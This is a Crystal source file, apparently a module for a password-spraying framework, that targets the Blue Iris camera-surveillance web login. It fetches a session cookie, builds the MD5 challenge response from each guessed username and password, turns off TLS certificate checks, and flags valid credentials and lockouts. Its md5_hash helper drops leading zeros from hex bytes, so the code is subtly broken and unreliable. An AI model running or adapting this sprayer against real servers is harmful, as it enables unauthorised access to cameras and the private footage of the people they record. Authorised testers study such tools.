require "http/client"

class BlueIris < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus
        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        if url.scheme == "https"
             #gotta set no verify for tls pages
            context = OpenSSL::SSL::Context::Client.new
            context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
            # create a http client 
            client = HTTP::Client.new(url, tls: context)
        else
            client = HTTP::Client.new(url)
        end
       




        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate, br",
            "Content-Type" => "text/plain",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}#{url.path}"
        } 

        ret = client.get("/")
        if ret.status_code == 403
            spstatus.lockedout = true
            return spstatus
        end
        session_cookie = ret.cookies["session"].value

        body =  {
            "cmd" => "login",
            "session" => session_cookie,
            "response" => md5_hash("#{username}:#{session_cookie}:#{password}")
        }.to_json.to_s # request form params here
        
        # here is the basic request 
        page = client.post("/json", headers: header, body: body) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 
        if page.status_code == 403
            spstatus.lockedout = true
        end

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 
        # these are EXAMPLES of how to do checks 
        begin 
            js = JSON.parse(page.body)
            if js["result"] != "fail"
                spstatus.valid_credentials = true 
            else 
                if js["data"]["reason"] == "Maximum login attempts exceeded"
                    spstatus.lockedout = true
                end
            end
        rescue
        end 


        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return the SprayStatus object 
        return spstatus
    end



    private def md5_hash(val : String) : String
        thing = Digest::MD5.new()
        thing << val
        # puts "hash: #{thing.hash}"
        str = ""
        temp = thing.final()
        # puts temp
        temp.each do |byte| 
            str += "%x" % [byte] 
        end
        str
    end
end